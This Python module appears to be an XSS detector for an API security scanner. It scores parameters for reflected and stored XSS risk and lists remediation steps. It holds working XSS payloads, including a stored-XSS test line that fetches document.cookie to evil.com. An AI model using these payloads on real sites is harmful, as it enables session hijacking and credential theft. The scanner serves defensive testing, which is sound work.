"""
XSS (Cross-Site Scripting) vulnerability detector.
"""

from typing import List, Optional
import re

from ..models import Endpoint, Vulnerability, Severity, Parameter
from .base import BaseVulnerability, VulnerabilityTest


class XSSDetector(BaseVulnerability):
    """Detects Cross-Site Scripting vulnerabilities."""
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "'-><script>alert('XSS')</script>",
        "<scr ipt>alert('XSS')</scr ipt>",
        "<script>alert(String.fromCharCode(88,83,83))</script>"
    ]
    
    REFLECTED_INDICATORS = [
        "reflected", "echo", "print", "response contains input",
        "mirrored", "returned in body"
    ]
    
    SUSPICIOUS_PARAM_NAMES = [
        'search', 'query', 'q', 'keyword', 'term',
        'name', 'username', 'title', 'description',
        'comment', 'message', 'content', 'text',
        'callback', 'redirect', 'return_url', 'next'
    ]
    
    def __init__(self):
        super().__init__()
        self._init_tests()
    
    def _init_tests(self):
        """Initialize XSS test cases."""
        self.tests = [
            VulnerabilityTest(
                name="Reflected XSS",
                payloads=self.XSS_PAYLOADS[:4],
                indicators=["script", "alert", "javascript", "onerror", "onload"],
                severity=Severity.HIGH
            ),
            VulnerabilityTest(
                name="Stored XSS",
                payloads=["<script>fetch('https://evil.com?c='+document.cookie)</script>"],
                indicators=["stored", "saved", "persisted"],
                severity=Severity.CRITICAL
            ),
            VulnerabilityTest(
                name="DOM-based XSS",
                payloads=["#<img src=x onerror=alert(1)", "javascript:alert(1)//"],
                indicators=["hash", "fragment", "location"],
                severity=Severity.MEDIUM
            ),
        ]
    
    def get_name(self) -> str:
        return "Cross-Site Scripting (XSS)"
    
    def get_description(self) -> str:
        return (
            "Cross-Site Scripting (XSS) allows attackers to inject malicious scripts "
            "into web pages viewed by other users. This can lead to session hijacking, "
            "credential theft, malware distribution, and defacement of web applications."
        )
    
    def get_remediation(self) -> str:
        return (
            "1. Implement Content Security Policy (CSP) headers\n"
            "2. Use auto-escaping template engines\n"
            "3. Encode all output based on context (HTML, JavaScript, URL, CSS)\n"
            "4. Validate and sanitize all user inputs on server-side\n"
            "5. Use modern frameworks with built-in XSS protection\n"
            "6. Implement HttpOnly and Secure flags on cookies\n"
            "7. Use X-XSS-Protection header as additional defense"
        )
    
    def get_cwe_id(self) -> Optional[str]:
        return "CWE-79"
    
    def get_owasp_category(self) -> Optional[str]:
        return "A03:2021 - Injection"
    
    def _static_analysis(self, endpoint: Endpoint) -> List[Vulnerability]:
        """Analyze endpoint for potential XSS vulnerabilities."""
        vulnerabilities = []
        
        # Check for output-reflecting parameters
        for param in endpoint.parameters:
            risk_score = self._calculate_param_risk(param, endpoint)
            
            if risk_score >= 3:
                test = VulnerabilityTest(
                    name="Potential Reflected XSS",
                    payloads=[],
                    indicators=[],
                    severity=Severity.HIGH if risk_score >= 4 else Severity.MEDIUM
                )
                
                vuln = self._create_vulnerability(
                    endpoint=endpoint,
                    test=test,
                    parameter=param.name,
                    evidence=f"Parameter '{param.name}' has high XSS risk (score: {risk_score}/5). "
                            "User input may be reflected in response without proper encoding."
                )
                vulnerabilities.append(vuln)
        
        # Check for JSONP-style callback parameters
        for param in endpoint.parameters:
            if param.name.lower() in ['callback', 'jsonp', 'cb']:
                test = VulnerabilityTest(
                    name="JSONP/Callback XSS Risk",
                    payloads=["alert(1)"],
                    indicators=["callback executed"],
                    severity=Severity.MEDIUM
                )
                
                vuln = self._create_vulnerability(
                    endpoint=endpoint,
                    test=test,
                    parameter=param.name,
                    evidence=f"JSONP callback parameter '{param.name}' detected. "
                            "Improper validation can lead to XSS via callback hijacking."
                )
                vulnerabilities.append(vuln)
        
        # Check POST/PUT endpoints with rich content
        if endpoint.method.value in ['POST', 'PUT'] and endpoint.request_body:
            schema = endpoint.request_body.get('schema', {})
            if 'properties' in schema:
                content_fields = [
                    k for k in schema['properties'].keys()
                    if any(term in k.lower() for term in ['content', 'html', 'body', 'message', 'description'])
                ]
                
                if content_fields:
                    test = VulnerabilityTest(
                        name="Potential Stored XSS",
                        payloads=[],
                        indicators=[],
                        severity=Severity.HIGH
                    )
                    
                    vuln = self._create_vulnerability(
                        endpoint=endpoint,
                        test=test,
                        evidence=f"Content fields detected ({content_fields}) in {endpoint.method.value} request. "
                                "Stored XSS possible if HTML/JS content is not properly sanitized."
                    )
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _calculate_param_risk(self, param: Parameter, endpoint: Endpoint) -> int:
        """Calculate risk score for a parameter."""
        risk = 0
        
        # Check parameter name against suspicious patterns
        param_name_lower = param.name.lower()
        for suspicious in self.SUSPICIOUS_PARAM_NAMES:
            if suspicious in param_name_lower:
                risk += 2
                break
        
        # Query parameters are higher risk for reflected XSS
        if param.location == 'query':
            risk += 1
        
        # String type without format constraint
        if param.param_type == 'string':
            risk += 1
        
        # GET requests with string parameters are classic reflected XSS vectors
        if endpoint.method.value == 'GET' and param.location == 'query':
            risk += 1
        
        return min(risk, 5)  # Cap at 5
